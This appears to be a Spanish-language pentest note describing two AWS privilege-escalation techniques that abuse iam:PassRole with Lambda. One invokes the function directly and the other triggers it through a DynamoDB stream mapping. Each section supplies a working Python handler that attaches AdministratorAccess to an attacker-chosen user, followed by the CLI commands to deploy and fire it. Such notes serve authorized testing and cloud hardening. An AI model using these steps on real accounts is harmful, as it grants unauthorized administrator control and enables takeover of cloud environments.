# PassExistingRoleToNewLambdaThenInvoke
Un atacante puede escalar privilegios pasando un rol existente de IAM a una nueva función lambda destinada a realizar acciones de su elección.

#### Permisos requeridos

- iam:PassRole
- lambda:CreateFunction
- lambda:InvokeFunction

### Ejecución

1) Creamos una función lambda que asigne a un usuario sobre el que tengamos control privilegios de amdmin.


        import boto3
        def lambda_handler(event, context):
          client = boto3.client('iam')
          response = client.attach_user_policy(UserName='<user>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
          return response

2) Comprimimos el archivo
3) Creamos la lambda

        aws lambda create-function --function-name privesc --runtime python3.6 --role <rol_privilegiado> --handler code.lambda_handler --zip-file fileb://function.zip --region us-east-2 --profile <profile>

4) Invocamos la lambda

        aws lambda invoke --function-name privesc output.txt --region us-east-2 --profile <profile>


---

# PassRoleToNewLambdaThenTriggerWithNewDynamo

A diferencia del caso anterior, un usuario que pueda crear una lambda pero no invocarla, puede aprovechar permisos para mapear la lambda a un evento en dynamodb para que se ejecute la lambda.

#### Permisos requeridos

- iam:PassRole
- lambda:CreateFunction
- lambda:CreateEventSourceMapping


### Ejecución:

1) Creamos la lambda

        import boto3
        def lambda_handler(event, context):
          client = boto3.client('iam')
          response = client.attach_user_policy(UserName='<user>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
          return response

2) Comprimimos la función
3) subimos la lambda

        aws lambda create-function --function-name privesc --runtime python3.6 --role <rol_privilegiado> --handler code.lambda_handler --zip-file fileb://function.zip --region us-east-2 --profile <profile>

4) Mapeamos la lambda con un evento específico.

   - Tomamos el arn del flujo más reciente de la dynamodb. Este se encuentra en Dynamodb > tablas > <tabla> > exportaciones y flujos.
   - Creamos el mapeo
  
          aws lambda create-event-source-mapping --function-name privesc --event-source-arn <arn_flujo> --enabled --starting-position LATEST --region us-east-1 --profile <profile>
  
5) Si tenemos un usuario que puede cargar datos en la dynamodb (dynamodb:PutItem) podemos hacer un registro en la DB o esperamos que otro usuario lo realice.



